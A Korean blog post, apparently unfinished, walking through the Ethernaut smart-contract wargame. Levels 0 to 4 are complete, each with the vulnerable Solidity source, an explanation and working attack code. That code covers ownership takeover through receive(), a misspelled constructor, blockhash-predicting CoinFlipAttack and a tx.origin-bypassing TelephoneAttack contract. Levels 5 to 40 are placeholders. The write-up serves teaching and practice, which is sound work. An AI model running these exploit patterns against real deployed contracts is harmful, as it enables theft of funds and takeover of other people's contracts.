---
layout: post
title: "Ethernaut 0~40"
date: 2026-06-03
category: "CTF/Wargame"
tags: ["Ethereum", "Solidity", "Ethernaut", "Smart Contract", "Wargame"]
excerpt: "Ethernaut 문제 풀이 미완"
---

<div class="ethernaut-pager" data-ethernaut-pager>
  <div class="ethernaut-pager__top">
    <span class="ethernaut-pager__status" data-ethernaut-status>Ethernaut 0 / 40</span>
  </div>
  <div class="ethernaut-pager__tabs" data-ethernaut-tabs aria-label="Ethernaut level navigation"></div>

<section class="ethernaut-page" data-ethernaut-page data-level-title="Hello Ethernaut" markdown="1">

## 0. Hello Ethernaut

### 문제 요약

Ethernaut 사용법과 콘솔 상호작용을 익히는 튜토리얼.

### 핵심

- 브라우저 콘솔
- `contract` 인스턴스 호출
- `await` 기반 트랜잭션 확인

### 풀이

개발자 도구 콘솔에서 Ethernaut이 제공하는 전역 객체를 확인한다.

```javascript
await contract.info()
```

반환값이 다음에 호출할 함수를 알려준다. 힌트를 따라가면 된다.

```javascript
await contract.info1()
await contract.info2("hello")
await contract.infoNum()
await contract.info42()
await contract.theMethodName()
await contract.method7123949()
```

마지막으로 `password` 값을 읽고 `authenticate`에 넘긴다.

### 공격 코드

```javascript
const password = await contract.password();
await contract.authenticate(password);
```

![alt text](/assets/images/ethernaut/image.png)

### 정리

0번은 Ethernaut 콘솔 사용법을 익히는 문제다. `contract` 인스턴스는 현재 레벨 컨트랙트를 가리키며

 `await`로 view 함수와 트랜잭션 함수를 호출할 수 있다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Fallback" markdown="1">

## 1. Fallback

### 문제 요약

이 레벨을 클리어하려면 다음 두 가지 조건을 모두 만족해야 한다.

- 해당 컨트랙트의 소유권 획득
- 컨트랙트의 잔액을 0으로 줄이기

### 핵심

- fallback / receive
- 소액 기여 조건
- 컨트랙트 소유권 변경

### 소스 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

### 풀이

핵심은 `receive()`다.

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

`receive()`는 ETH를 직접 보낼 때 실행된다. 조건은 두 개다.

1. `msg.value > 0`
2. `contributions[msg.sender] > 0`

그래서 먼저 `contribute()`로 기여 기록을 만든다. 그 다음 컨트랙트에 ETH를 직접 보내면 `owner`가 내 주소로 바뀐다. 마지막으로 `withdraw()`를 호출해 잔액을 비운다.

### 공격 코드

```javascript
await contract.contribute({ value: 1 })

await sendTransaction({ to: contract.address, value: 1 })

await contract.withdraw()
```

- `contribute({ value: 1 })`: 1 wei를 보내 `contributions[player]` 값을 0보다 크게 만든다.
- `sendTransaction({ to: contract.address, value: 1 })`: 컨트랙트에 ETH를 직접 보내 `receive()`를 실행한다. 이때 `owner`가 내 주소로 바뀐다.
- `withdraw()`: `owner` 권한으로 컨트랙트 잔액을 출금한다.

### 정리

소액 기여 후 ETH를 직접 전송하면 `receive()`로 소유권을 탈취할 수 있다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Fallout" markdown="1">

## 2. Fallout

### 문제 요약

컨트랙트의 소유권을 획득하면 클리어된다. 핵심은 생성자로 보여야 하는 함수가 실제로는 일반 public 함수라는 점이다.

### 핵심

- 생성자 오타
- 과거 Solidity 문법
- 접근 제어 실수

### 소스 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Fallout {
    mapping(address => uint256) allocations;
    address payable public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    function allocate() public payable {
        allocations[msg.sender] += msg.value;
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

### 풀이

Solidity 0.4.22 이전에는 `constructor` 키워드가 아니라 컨트랙트 이름과 같은 함수가 생성자였다.

이 컨트랙트 이름은 `Fallout`인데 함수 이름은 `Fal1out`이다. 알파벳 `l`이 아니라 숫자 `1`이 들어가 있다.

```solidity
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

그래서 이 함수는 배포 시 한 번만 실행되는 생성자가 아니다. 누구나 호출할 수 있는 public 함수다. 호출하면 `owner`가 `msg.sender`로 바뀐다.

### 공격 코드

```javascript
await contract.Fal1out()
await contract.owner()
```

- `Fal1out()`: 일반 public 함수라서 직접 호출 가능하다. 호출자의 주소가 `owner`가 된다.
- `owner()`: 소유권이 내 주소로 바뀌었는지 확인한다.

### 정리

생성자 이름을 잘못 쓰면 초기화 함수가 외부에 열린다. 과거 Solidity 코드에서는 컨트랙트 이름과 생성자 함수명이 정확히 일치하는지 확인해야 한다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Coin Flip" markdown="1">

## 3. Coin Flip

### 문제 요약

동전 던지기를 10번 연속 맞히면 클리어된다. 문제는 랜덤값이 실제 난수가 아니라 블록 정보로 계산된 예측 가능한 값이라는 점이다.

### 핵심

- 온체인 난수 취약점
- `blockhash`
- 예측 가능한 상태값

### 소스 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

### 풀이

`flip()`은 이전 블록 해시를 숫자로 바꾼 뒤 `FACTOR`로 나눈다.

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

이 값은 같은 블록 안에서 누구나 똑같이 계산할 수 있다. 그래서 공격 컨트랙트에서 동일한 계산을 먼저 하고, 나온 값을 그대로 `flip()`에 넘기면 된다.

단, `lastHash` 검사 때문에 같은 블록에서 여러 번 호출할 수 없다.

```solidity
if (lastHash == blockValue) {
    revert();
}
```

따라서 공격 함수는 블록마다 한 번씩 총 10번 호출한다.

### 공격 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    ICoinFlip private immutable target;

    constructor(address targetAddress) {
        target = ICoinFlip(targetAddress);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1;

        target.flip(guess);
    }
}
```

여기서 어떻게 하는지 몰라서 시간이 좀 걸렸다...

Remix IDE에 파일을 만들고 위 코드넣어서 compile 하고 지갑연결하고 어쩌고저쩌고

타겟주소 = 문제 인스턴스 주소

해서

Deploy

배포 후 `attack()`을 10개 블록에 걸쳐 10번 실행한다.

```javascript
await contract.consecutiveWins()
```

값이 `10`이면 인스턴스를 제출하면 된다.

### 정리

블록 해시, 타임스탬프 같은 온체인 값은 난수로 쓰면 안 된다. 모든 참여자가 같은 값을 읽고 같은 결과를 미리 계산할 수 있다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Telephone" markdown="1">

## 4. Telephone

### 문제 요약

컨트랙트의 `owner`를 내 주소로 바꾸면 클리어된다. 직접 호출하면 실패하고, 중간 컨트랙트를 거쳐 호출해야 한다.

### 핵심

- `tx.origin`
- `msg.sender`
- 피싱형 호출 구조

### 소스 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

### 풀이

취약한 부분은 `changeOwner()`의 조건문이다.

```solidity
if (tx.origin != msg.sender) {
    owner = _owner;
}
```

EOA가 직접 `changeOwner()`를 호출하면 다음처럼 된다.

- `tx.origin`: 내 지갑 주소
- `msg.sender`: 내 지갑 주소

둘이 같으므로 조건을 통과하지 못한다.

하지만 공격 컨트랙트를 거쳐 호출하면 값이 달라진다.

- `tx.origin`: 내 지갑 주소
- `msg.sender`: 공격 컨트랙트 주소

이제 `tx.origin != msg.sender`가 참이 되고, `owner`를 내가 원하는 주소로 바꿀 수 있다.

### 공격 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone private immutable target;

    constructor(address targetAddress) {
        target = ITelephone(targetAddress);
    }

    function attack(address newOwner) external {
        target.changeOwner(newOwner);
    }
}
```

배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.

```javascript
contract.address
```

배포 후 공격 컨트랙트의 `attack()`에 내 지갑 주소를 넣고 실행한다.

```javascript
await contract.owner()
```

`owner`가 내 주소로 바뀌었으면 인스턴스를 제출하면 된다.

### 정리

권한 검증에 `tx.origin`을 쓰면 중간 컨트랙트 호출에 취약하다. 인증과 권한 확인은 보통 `msg.sender` 기준으로 해야 한다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Token" markdown="1">

## 5. Token

### 문제 요약

작성 예정.

### 핵심

- 정수 언더플로우
- Solidity 0.8 이전 산술
- 잔액 검증

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Delegation" markdown="1">

## 6. Delegation

### 문제 요약

작성 예정.

### 핵심

- `delegatecall`
- 스토리지 컨텍스트
- 함수 selector

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Force" markdown="1">

## 7. Force

### 문제 요약

작성 예정.

### 핵심

- `selfdestruct`
- 강제 ETH 전송
- `receive` 없는 컨트랙트

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Vault" markdown="1">

## 8. Vault

### 문제 요약

작성 예정.

### 핵심

- private 변수의 한계
- 스토리지 슬롯 조회
- 온체인 데이터 공개성

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="King" markdown="1">

## 9. King

### 문제 요약

작성 예정.

### 핵심

- DoS
- ETH 수신 거부
- `transfer` 실패 처리

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Re-entrancy" markdown="1">

## 10. Re-entrancy

### 문제 요약

작성 예정.

### 핵심

- 재진입 공격
- Checks-Effects-Interactions
- 출금 로직 순서

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Elevator" markdown="1">

## 11. Elevator

### 문제 요약

작성 예정.

### 핵심

- 인터페이스 신뢰 문제
- 상태 변화 기반 응답
- 외부 컨트랙트 호출

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Privacy" markdown="1">

## 12. Privacy

### 문제 요약

작성 예정.

### 핵심

- 스토리지 레이아웃
- packing
- bytes 캐스팅

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Gatekeeper One" markdown="1">

## 13. Gatekeeper One

### 문제 요약

작성 예정.

### 핵심

- modifier 우회
- gas 조절
- bytes 변환 조건

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Gatekeeper Two" markdown="1">

## 14. Gatekeeper Two

### 문제 요약

작성 예정.

### 핵심

- 생성자 실행 중 code size
- XOR 조건
- `extcodesize`

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Naught Coin" markdown="1">

## 15. Naught Coin

### 문제 요약

작성 예정.

### 핵심

- ERC-20 allowance
- `transferFrom`
- 제한 함수 우회

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Preservation" markdown="1">

## 16. Preservation

### 문제 요약

작성 예정.

### 핵심

- `delegatecall`
- 스토리지 슬롯 충돌
- 라이브러리 주소 변조

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Recovery" markdown="1">

## 17. Recovery

### 문제 요약

작성 예정.

### 핵심

- 컨트랙트 주소 계산
- nonce
- 잃어버린 인스턴스 복구

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="MagicNumber" markdown="1">

## 18. MagicNumber

### 문제 요약

작성 예정.

### 핵심

- EVM bytecode
- 런타임 코드
- 최소 컨트랙트

### 풀이

작성 예정.

### 공격 코드

```text
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Alien Codex" markdown="1">

## 19. Alien Codex

### 문제 요약

작성 예정.

### 핵심

- 배열 길이 언더플로우
- 스토리지 슬롯 계산
- owner 슬롯 덮어쓰기

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Denial" markdown="1">

## 20. Denial

### 문제 요약

작성 예정.

### 핵심

- gas griefing
- 외부 호출 실패
- 서비스 거부

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Shop" markdown="1">

## 21. Shop

### 문제 요약

작성 예정.

### 핵심

- view 함수 신뢰 문제
- 상태 기반 가격 조작
- 인터페이스 응답 변경

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Dex" markdown="1">

## 22. Dex

### 문제 요약

작성 예정.

### 핵심

- AMM 가격 계산
- 유동성 고갈
- 슬리피지 검증 부재

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Dex Two" markdown="1">

## 23. Dex Two

### 문제 요약

작성 예정.

### 핵심

- 토큰 주소 검증 부재
- 가짜 토큰
- 비정상 교환 경로

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Puzzle Wallet" markdown="1">

## 24. Puzzle Wallet

### 문제 요약

작성 예정.

### 핵심

- proxy storage collision
- multicall
- 잔액 중복 반영

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Motorbike" markdown="1">

## 25. Motorbike

### 문제 요약

작성 예정.

### 핵심

- UUPS proxy
- 초기화 누락
- implementation 파괴

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="DoubleEntryPoint" markdown="1">

## 26. DoubleEntryPoint

### 문제 요약

작성 예정.

### 핵심

- delegate token
- Forta bot
- 탐지 로직 작성

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Good Samaritan" markdown="1">

## 27. Good Samaritan

### 문제 요약

작성 예정.

### 핵심

- custom error
- 예외 기반 분기
- 악성 receiver

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Gatekeeper Three" markdown="1">

## 28. Gatekeeper Three

### 문제 요약

작성 예정.

### 핵심

- constructor 착각
- owner 조건
- ETH 전송 실패 유도

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Switch" markdown="1">

## 29. Switch

### 문제 요약

작성 예정.

### 핵심

- calldata 인코딩
- offset 조작
- selector 검증 우회

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="HigherOrder" markdown="1">

## 30. HigherOrder

### 문제 요약

작성 예정.

### 핵심

- ABI 타입 검증 차이
- calldata 직접 구성
- 짧은 타입 우회

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Stake" markdown="1">

## 31. Stake

### 문제 요약

작성 예정.

### 핵심

- WETH 흐름
- 상태 불일치
- staking 조건 검증

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Impersonator" markdown="1">

## 32. Impersonator

### 문제 요약

작성 예정.

### 핵심

- 서명 검증
- ECDSA
- 신원 위장

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Magic Animal Carousel" markdown="1">

## 33. Magic Animal Carousel

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Bet House" markdown="1">

## 34. Bet House

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Elliptic Token" markdown="1">

## 35. Elliptic Token

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Cashback" markdown="1">

## 36. Cashback

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Impersonator Two" markdown="1">

## 37. Impersonator Two

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="UniqueNFT" markdown="1">

## 38. UniqueNFT

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Forger" markdown="1">

## 39. Forger

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="NotOptimisticPortal" markdown="1">

## 40. NotOptimisticPortal

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>

  <div class="ethernaut-pager__bottom">
    <button type="button" class="ethernaut-pager__button" data-ethernaut-prev>이전</button>
    <button type="button" class="ethernaut-pager__button" data-ethernaut-next>다음</button>
  </div>
</div>

<style>
  .ethernaut-pager {
    display: grid;
    gap: 1.25rem;
  }

  .post-toc {
    display: none !important;
  }

  .ethernaut-pager__top,
  .ethernaut-pager__bottom {
    display: flex;
    align-items: center;
    gap: 0.75rem;
    padding: 0.85rem;
    border: 1px solid rgba(42, 91, 138, 0.16);
    border-radius: 8px;
    background: rgba(238, 246, 252, 0.74);
  }

  .ethernaut-pager__top {
    justify-content: center;
  }

  .ethernaut-pager__bottom {
    justify-content: space-between;
  }

  .ethernaut-pager__status {
    color: #163a5f;
    font-size: 0.95rem;
    font-weight: 800;
    text-align: center;
  }

  .ethernaut-pager__button,
  .ethernaut-pager__tabs button {
    min-height: 40px;
    border: 1px solid rgba(42, 91, 138, 0.2);
    border-radius: 8px;
    background: #fbfdff;
    color: #163a5f;
    cursor: pointer;
    font: inherit;
    font-weight: 800;
    transition: background 0.18s ease, border-color 0.18s ease, transform 0.18s ease;
  }

  .ethernaut-pager__button {
    padding: 0 1rem;
  }

  .ethernaut-pager__tabs {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(42px, 1fr));
    gap: 0.45rem;
  }

  .ethernaut-pager__tabs button {
    padding: 0;
  }

  .ethernaut-pager__button:hover,
  .ethernaut-pager__tabs button:hover,
  .ethernaut-pager__button:focus-visible,
  .ethernaut-pager__tabs button:focus-visible {
    border-color: rgba(45, 129, 198, 0.58);
    background: #eef6fc;
    transform: translateY(-1px);
  }

  .ethernaut-pager__button:disabled {
    cursor: not-allowed;
    opacity: 0.45;
    transform: none;
  }

  .ethernaut-pager__tabs button.is-active {
    background: #163a5f;
    color: #f7fbff;
    border-color: #163a5f;
  }

  .ethernaut-page[hidden] {
    display: none;
  }

  body.dark-mode .ethernaut-pager__top,
  body.dark-mode .ethernaut-pager__bottom {
    border-color: rgba(132, 181, 223, 0.2);
    background: rgba(15, 25, 36, 0.78);
  }

  body.dark-mode .ethernaut-pager__status {
    color: #d8ecff;
  }

  body.dark-mode .ethernaut-pager__button,
  body.dark-mode .ethernaut-pager__tabs button {
    border-color: rgba(132, 181, 223, 0.22);
    background: rgba(12, 21, 31, 0.94);
    color: #d8ecff;
  }

  body.dark-mode .ethernaut-pager__tabs button.is-active {
    background: #74b9ef;
    color: #06111d;
    border-color: #74b9ef;
  }

  @media (max-width: 640px) {
    .ethernaut-pager__tabs {
      grid-template-columns: repeat(5, minmax(0, 1fr));
    }
  }
</style>

<script>
  (() => {
    const pager = document.querySelector('[data-ethernaut-pager]');

    if (!pager) {
      return;
    }

    const pages = Array.from(pager.querySelectorAll('[data-ethernaut-page]'));
    const tabsContainer = pager.querySelector('[data-ethernaut-tabs]');
    const status = pager.querySelector('[data-ethernaut-status]');
    const prevButtons = Array.from(pager.querySelectorAll('[data-ethernaut-prev]'));
    const nextButtons = Array.from(pager.querySelectorAll('[data-ethernaut-next]'));
    const initialLevel = Number(new URLSearchParams(window.location.search).get('level'));
    let currentIndex = Number.isInteger(initialLevel) ? initialLevel : 0;

    const maxIndex = pages.length - 1;
    const clampIndex = (index) => Math.min(Math.max(index, 0), maxIndex);

    const createTabs = () => {
      pages.forEach((page, index) => {
        const tab = document.createElement('button');
        tab.type = 'button';
        tab.dataset.ethernautTab = String(index);
        tab.textContent = String(index);
        tab.title = page.dataset.levelTitle || 'Level ' + index;
        tab.setAttribute('aria-label', 'Ethernaut ' + index + ': ' + tab.title);
        tab.addEventListener('click', () => showPage(index, true));
        tabsContainer.appendChild(tab);
      });
    };

    const getTabs = () => Array.from(pager.querySelectorAll('[data-ethernaut-tab]'));

    const showPage = (index, shouldScroll = false) => {
      currentIndex = clampIndex(index);

      pages.forEach((page, pageIndex) => {
        page.hidden = pageIndex !== currentIndex;
      });

      getTabs().forEach((tab) => {
        const isActive = Number(tab.dataset.ethernautTab) === currentIndex;
        tab.classList.toggle('is-active', isActive);
        tab.setAttribute('aria-current', isActive ? 'page' : 'false');
      });

      prevButtons.forEach((button) => {
        button.disabled = currentIndex === 0;
      });

      nextButtons.forEach((button) => {
        button.disabled = currentIndex === maxIndex;
      });

      if (status) {
        status.textContent = 'Ethernaut ' + currentIndex + ' / ' + maxIndex + ' - ' + (pages[currentIndex].dataset.levelTitle || '');
      }

      const url = new URL(window.location.href);
      url.searchParams.set('level', currentIndex);
      window.history.replaceState(null, '', url);

      if (shouldScroll) {
        pager.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    };

    prevButtons.forEach((button) => {
      button.addEventListener('click', () => showPage(currentIndex - 1, true));
    });

    nextButtons.forEach((button) => {
      button.addEventListener('click', () => showPage(currentIndex + 1, true));
    });

    createTabs();
    showPage(currentIndex);
  })();
</script>
